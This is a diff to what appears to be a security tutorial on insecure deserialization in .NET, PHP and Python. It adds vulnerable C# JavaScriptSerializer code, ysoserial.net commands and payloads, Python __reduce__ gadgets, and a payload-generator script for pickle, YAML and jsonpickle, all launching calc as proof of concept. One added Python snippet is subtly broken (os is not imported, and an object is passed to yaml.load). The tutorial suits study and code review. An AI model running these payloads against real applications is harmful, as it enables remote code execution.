@@ -1100,7 +1100,7 @@ So, if we craft an xml using the following serializer, it won't work:
 
 ```csharp
  [Serializable]
-public class RCE : IDeserializationCallback
+public class RCE
 {
     private String _cmd = "calc.exe";
     public String cmd
@@ -1131,18 +1131,120 @@ public static void xmlRCESerial(string filename)
 } 
 ```
 
-However, we can possibly exploit this function by means of POP gadgets:
+However, it is possible to exploit this function chaining POP gadgets. To generate a valid payload, in this case, we can use `ysoserial.net`:
 
-
+```bash
+$ ysoserial-net -g ObjectDataProvider -f XmlSerializer -c "calc" -o raw
+```
 
 **JSON**
 
-In their reasearch, [Firday the 13th, JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf) 
+In their reasearch, [Firday the 13th, JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf), Alvaro Muñoz and Oleksandr Mirosh explained how it was possible to apply similar methods seen for JAVA JSON deserialization to exploit .NET JSON deserializtion. The research is extremely accurate, and points out a list of libraries affected by this vulnerability. As such, I won't cover in details every library, but focus more on explaining that no concrete difference exists between JSON and XML/Binary deserialization in terms of exploitation.
 
-The 
+The research states that, in order to successfully exploit JSON deserialization, the following conditions must be satisfied:
 
+1. Attacker can control type of reconstructed objects [Same as binary/xml]
+    * Can specify Type
+        + _type, $type, class, classname, javaClass, ..., etc.
+    * Library loads and instantiate Type
+2. Library/GC will call methods on reconstructed objects [Setter/Getter/Constructors/Destructors, same as for binary/xml]
+3. There are gadget chains starting on method executed upon/after reconstruction [Visibility constraint, same as for binary/xml]
 
+As highlighted, there is no big difference from the constraints we've seen so far.
 
+In order to show that, we'll take as example `JavaScriptSerializer`. The reason I love pwning this kind of serializer is the fact that it is not vulnerable by itself. It becomes vulnerable if used in combination with `SimpleTypeResolver`.
+To explain what I'm saying, let's consider the following vulnerable example:
+
+```csharp
+public static void jsonRCEDeserial(string filename)
+{
+    filename += ".json";
+    // Vulnerable use of JavaScriptSerializer
+    JavaScriptSerializer serializer = new JavaScriptSerializer(new SimpleTypeResolver());
+    var stream = new FileStream(filename, FileMode.Open, FileAccess.Read);
+    var reader = new StreamReader(stream);
+    var desert = serializer.Deserialize<Desert>(reader.ReadToEnd());
+    reader.Close();
+    stream.Close();
+}
+
+[Serializable]
+public class RCE 
+{
+    private String _cmd;
+    public String cmd
+    {
+        get { return _cmd; }
+        set
+        {
+            _cmd = value;
+            Run();
+        }
+    }
+
+    public void Run()
+    {
+        System.Diagnostics.Process p = new System.Diagnostics.Process();
+        p.StartInfo.FileName = _cmd;
+        p.Start();
+        p.Dispose();
+    }
+}
+
+[Serializable]
+public class Desert
+{
+    private String _name;
+    public String name
+    {
+        get { return _name; }
+        set { _name = value; Console.WriteLine("Desert name: " + _name); }
+    }
+}
+```
+
+As you can see, the serializer is unsafely used to deserialize an expected Desert object. However, the type definition on the deserializer doesn't forbid the deserialization of unkown objects, as `JavaScriptSerializer` doesn't perform any kind of whitelisting or object inspection. As such, like we previously explained, the `RCE` class can be used as a valid gadget, triggering a remote command execution during the deserialization process. 
+
+To build a successful payload, the following code can be used:
+
+```csharp
+public static void jsonRCESerial(string filename)
+{
+    filename += ".json";
+    var desert = new RCE();
+    desert.cmd = "calc.exe";
+    // Persist to file
+    using (StreamWriter stream = File.CreateText(filename))
+    {
+        Console.WriteLine("Serializing RCE");
+        JavaScriptSerializer serializer = new JavaScriptSerializer();
+        stream.Write(serializer.Serialize(desert));
+    }
+}
+```
+Which would produce the following payload:
+
+```bash
+{"__type":"BinarySerialization.RCE, BinarySeriliazer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null","cmd":"calc.exe"}
+```
+
+Of course, it is also possible to generate an exploitation payload using `ysoserial.net`:
+
+```bash
+$ ysoserial-net -g ObjectDataProvider -f JavaScriptSerializer -c "calc" -o raw
+{
+    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+    'MethodName':'Start',
+    'ObjectInstance':{
+        '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+        'StartInfo': {
+            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+            'FileName':'cmd',
+            'Arguments':'/c calc'
+        }
+    }
+}
+```
 
 **Tips for Source Code reviewers**
 
@@ -1168,14 +1270,12 @@ For each match, the code should be manually inspected to see whether the object 
 
 * [Analyze Binary Serialization Stream](https://stackoverflow.com/questions/3052202/how-to-analyse-contents-of-binary-serialization-stream)
 * [ysoserial.net](https://github.com/pwntester/ysoserial.net/)
-* 
-
-
-
+* [Are you my type?](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
+* [Friday the 13th: JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
 
 ### PHP
 
-PHP implements the serialize() and unserialize() functions to perform serialization and deserialization is used to store, transfer and transform whole objects. The PHP serialized object format, it's not far from a JSON array and it is human readable.
+PHP implements the serialize() and unserialize() functions to perform serialization and deserialization is used to store, transfer and transform whole objects. The PHP serialized object format, it's not far from a JSON array and it's human readable.
 
 ```
 PHP serialized object example:
@@ -1186,8 +1286,12 @@ A good example of serialized object in PHP is the session file, usually stored w
 
 #### PHP: How the exploitation works
 
-The exploitation in PHP strictly depends on an application specific implementation.
+The exploitation in PHP strictly depends on the application specific implementation. What does that mean? As we already seen for JAVA and .NET, exploiting deserialization require chaining or exploiting class/objects which are implemented in a specific way (gadgets). That would mean that, if a PHP application was built in pure functional PHP, there would be no way to find valid POP gadgets, and virtually impossible to exploit this kind of issue. 
+Even PHP libraries are not uniformely shared among PHP based frameworks/applications; as such, the process of generalizing these kind of exploit is unfeasible. 
 
+
+
+However, within the years, a good number of POP gadgets (framewoek specific), have been identified and collected in a PHP version of ysoserial, [PHPGGC](https://github.com/ambionics/phpggc).
 
 ### Python
 
@@ -1363,6 +1467,18 @@ The main concept is the always the same, trick the appliction into loading arbit
 - cmd /c calc
 ```
 
+This simple payload can be created easily using the following code:
+
+```python
+import yaml, os
+
+class Payload:
+    def __reduce__(self):
+        return (os.system, ("cmd /c calc.exe",))
+    
+yaml.dump(Payload())
+```
+
 Later we'll see how to create custom payloads dynamically.
 
 **JSON**
@@ -1410,37 +1526,28 @@ Which would produce the following results:
 ```
 $ python tracer.py
 
-Call to loads on line 299 of C:\Users\amagnosi\AppData\Local\Programs\Python\Python37\lib\json\__init__.py from line 207 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\back
-end.py
+Call to loads on line 299 of C:\Users\amagnosi\AppData\Local\Programs\Python\Python37\lib\json\__init__.py from line 207 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\backend.py
 Call to loadclass on line 600 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\unpickler.py from line 326 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-
 packages\jsonpickle\unpickler.py
 ```
 
-Ok, that's sounds interesting, but how can we exploit all these cases? Moreover, is that possible to craft a more general way to effectively serialize this kind of payloads? The answer is, as you may imagine, that is definitely possible to do that.
-
-Taking as a general example the following vulnerable code:
+As for the previous two modules, the serialization processs uses `__reduce__` to create the serializaed representation of the object. Generate a working exploit is as easy as it was for PyYAML, and can be done using the following code:
 
 ```python
-import _pickle
-import sys
 import yaml
-import jsonpickle
 
-if sys.argv[1] == "b":
-    with open("payload.bin", "rb") as payload:
-        _pickle.loads(payload.read())
-elif sys.argv[1] == "y":
-    with open("payload.yml", "r") as payload:
-        if float(yaml.__version__) <= 5.1: 
-            yaml.load(payload)
-        else:
-            yaml.unsafe_load(payload)
-elif sys.argv[1] == "j":
-    with open("payload.json", "r") as payload:
-        jsonpickle.decode(payload.read())
+class Payload:
+    def __reduce__(self):
+        return (os.system, ("cmd /c calc.exe",))
+    
+yaml.load(Payload())
 ```
 
-For the sake of giving a working example, I created the following code, which can be used to generate different payloads for pickle, yaml and jsonpickle:
+Ok, that's seems interesting, but still we would like to generate our serialized payloads without rewriting the code anytime we need to issue a different command, right? So, last but not least, we'll explore a way to dynamically generate valid payloads for all the python modules we saw above.
+
+**Generating Exploits for pickle, PyYAML, and jsonpickle**
+
+I created the following code, which can be used to generate different payloads for pickle, yaml and jsonpickle:
 
 ```python
 import os
@@ -1508,20 +1615,80 @@ if __name__ == "__main__":
     cls = Payload(command, args.vector)
 
     if args.format == "pickle":
-
-        with open("payload.bin", "wb") as payload:
-            payload.write(_pickle.dumps(cls))
+        if args.save:
+            with open("payload.bin", "wb") as payload:
+                payload.write(_pickle.dumps(cls))
+        else:
+            print(f"[+] Final Payload:\n    {_pickle.dumps(cls)}")
     elif args.format == "json":
-        with open("payload.json", "w") as payload:
-            payload.write(jsonpickle.encode(cls))
+        if args.save:
+            with open("payload.json", "w") as payload:
+                payload.write(jsonpickle.encode(cls))
+        else:
+            print(f"[+] Final Payload:\n    {jsonpickle.encode(cls)}")
     elif args.format == "yaml":
-        with open("payload.yml", "w") as payload:
-            yaml.dump(cls, payload)
+        if args.save:
+            with open("payload.yml", "w") as payload:
+                yaml.dump(cls, payload)
+        else:
+            p = yaml.dump(cls).replace('\n', '\n    ')
+            print(f"[+] Final Payload:\n    {p}")
     else:
         sys.exit()
 ```
 
-Now that we explained the main ways to explained the main ways to exploit python 
+The functions provided by this simple tool can be inpected using the help:
+
+```bash
+$ python PayloadGenerator.py -h
+usage: PayloadGenerator.py [-h] [-d] [-s] [-v {os,subprocess}] -f {pickle,json,yaml,#} [-c COMMAND]
+
+pysoserial - A simple serialization payload generator
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -d, --debug           Enable debug messages
+  -s, --save            Save payload to file
+  -v {os,subprocess}, --vector {os,subprocess}
+                        Save payload to file
+  -f {pickle,json,yaml,#}, --format {pickle,json,yaml,#}
+                        Serialization archive format
+  -c COMMAND, --command COMMAND
+                        Command for the payload
+
+```
+
+To test our payloads, and for simplicity, we'll use the following vulnerable code:
+
+```python
+import _pickle
+import sys
+import yaml
+import jsonpickle
+
+if sys.argv[1] == "b":
+    with open("payload.bin", "rb") as payload:
+        _pickle.loads(payload.read())
+elif sys.argv[1] == "y":
+    with open("payload.yml", "r") as payload:
+        if float(yaml.__version__) <= 5.1: 
+            yaml.load(payload)
+        else:
+            yaml.unsafe_load(payload)
+elif sys.argv[1] == "j":
+    with open("payload.json", "r") as payload:
+        jsonpickle.decode(payload.read())
+```
+
+To generate a valid payload for jsonpickle, for example, we can use the script with the follwing args:
+
+```bash
+$ python PayloadGenerator.py -f json -v os -c "cmd /c calc"
+[+] Generating serialized object for:
+    cmd /c calc
+[+] Final Payload:
+    {"py/reduce": [{"py/function": "nt.system"}, {"py/tuple": ["cmd /c calc"]}]}
+```
 
 #### References
 
